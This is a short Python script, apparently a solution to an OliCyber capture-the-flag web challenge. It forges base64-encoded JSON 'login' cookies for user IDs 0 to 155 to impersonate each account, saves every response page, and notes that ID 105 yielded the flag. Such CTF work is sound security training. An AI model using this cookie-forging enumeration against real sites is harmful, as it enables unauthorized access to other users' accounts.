import requests
import base64
import random
import re
from bs4 import BeautifulSoup
import json
import os
import pathlib
# Cambia la cartella corrente in quella dove si trova il file .py
os.chdir(os.path.dirname(os.path.abspath(__file__)))
os.chdir("./output")
# Controlla la cartella corrente
print("Cartella corrente:", os.getcwd())

urlbase = 'http://sn4ck-sh3nan1gans.challs.olicyber.it/'
s = requests.Session()
k=146
output = {}
for i in range(0, 156):
    id_str = '{"ID":' + str(i) + '}'
    base64_id = base64.b64encode(id_str.encode('utf-8')).decode('ascii')
    s.cookies.update({"login": base64_id})
    r = s.get(urlbase + 'home.php')

    soup = BeautifulSoup(r.text, "html.parser")
    h1_tags = [h1.get_text(strip=True) for h1 in soup.find_all("h1")]

    # Creazione cartella
    folder_path = pathlib.Path(base64_id)
    folder_path.mkdir(exist_ok=True)

    # Salva HTML
    html_path = pathlib.Path(".") / folder_path / "response.html"
    html_path.write_text(r.text, encoding='utf-8')

    # Salva dati in output
    output[i] = {
        "h1_tags": h1_tags,
        "cookies": s.cookies.get_dict(),
        "status_code": r.status_code,
        "content": str(html_path.resolve())
    }

    # Stampa h1
    for h1 in h1_tags:
        print(h1)


output_json = json.dumps(output, indent=4)
with open("../output.json", "w") as f:
    f.write(output_json)
    
   

    
#105 flag